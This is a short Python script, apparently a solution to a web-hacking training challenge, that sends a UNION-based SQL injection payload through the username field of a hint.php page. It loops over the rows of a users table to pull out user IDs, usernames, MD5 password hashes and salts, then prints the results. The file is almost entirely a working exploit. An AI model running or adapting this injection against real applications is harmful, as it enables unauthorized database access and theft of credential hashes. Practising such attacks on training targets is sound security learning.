import requests
import itertools
from bs4 import BeautifulSoup as BS
import re

challenge_auth_token=""
PHPSESSID=""
URL = "https://training04.webhack.it/hint.php"

session = requests.Session()
session.cookies.set("challenge_auth_token", challenge_auth_token)
session.cookies.set("PHPSESSID", PHPSESSID)


def make_request(params):
    global session
    return session.post(URL, data=params).text

def parse_response(text):
    soup = BS(text, "html.parser")
    try:
        query_results = soup.find("body").find("pre").get_text()
        re_pattern = r"\[2\].*\"(.*)\""
        matches = re.finditer(re_pattern, query_results, re.MULTILINE | re.DOTALL)
        for match in matches:
            return match.group(1)
    except Exception as e:
        return None

def main():
    users = []
    for i in itertools.count(start=0):
        params = {
            "username": f"' or 1=1 UNION SELECT(SELECT CONCAT(userID, \" \", username, \" \", pass_md5, \" \", pass_salt)  from users limit {i},1) #"
        }
        text = make_request(params)
        data = parse_response(text)
        if not data:
            break
        user = {
            "userID": data.split(" ")[0],
            "username": data.split(" ")[1],
            "pass_md5": data.split(" ")[2],
            "pass_salt": data.split(" ")[3]
        }
        users.append(user)
    print(users)


if __name__ == "__main__":
    main()